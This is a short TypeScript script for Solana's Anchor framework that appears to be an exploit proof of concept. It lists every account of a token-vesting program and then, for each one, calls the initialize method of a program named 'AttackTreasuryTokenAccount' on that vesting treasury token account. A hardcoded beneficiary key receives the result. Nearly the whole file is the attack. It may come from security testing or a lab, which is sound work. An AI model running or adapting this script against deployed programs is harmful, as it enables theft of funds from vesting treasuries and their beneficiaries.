import * as anchor from '@coral-xyz/anchor'
import NodeWallet from '@coral-xyz/anchor/dist/cjs/nodewallet'
import { VestingIDL } from '@project/anchor'
import type { Vesting } from '@project/anchor'
import { TOKEN_PROGRAM_ID } from '@solana/spl-token'
import { PublicKey } from '@solana/web3.js'

import AttackTreasuryTokenAccountIDL from 'anchor/target/idl/attack_treasury_token_account.json'
import type { AttackTreasuryTokenAccount } from 'anchor/target/types/attack_treasury_token_account'

const provider = anchor.AnchorProvider.env()
anchor.setProvider(provider)
const beneficiary = new PublicKey('GHCt8s1ieiTmN9RV7CppN6YA3uxi6yPZqYaLgrMCVdJP')
const vesting = new anchor.Program<Vesting>(VestingIDL, provider)
const program = new anchor.Program<AttackTreasuryTokenAccount>(AttackTreasuryTokenAccountIDL, provider)
const vesting_fetch = await vesting.account.vestingDataAccount.all()

console.log(vesting_fetch)

for (const vestingDataAccount of vesting_fetch) {
  await program.methods
    .initialize(vestingDataAccount.account.companyName, vestingDataAccount.account.treasuryBump)
    .accounts({
      mint: vestingDataAccount.account.mint,
      beneficiary,
      vestingProgram: new PublicKey(VestingIDL.address),
      treasuryTokenAccount: vestingDataAccount.account.treasuryTokenAccount,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .rpc({ commitment: 'confirmed' })
}
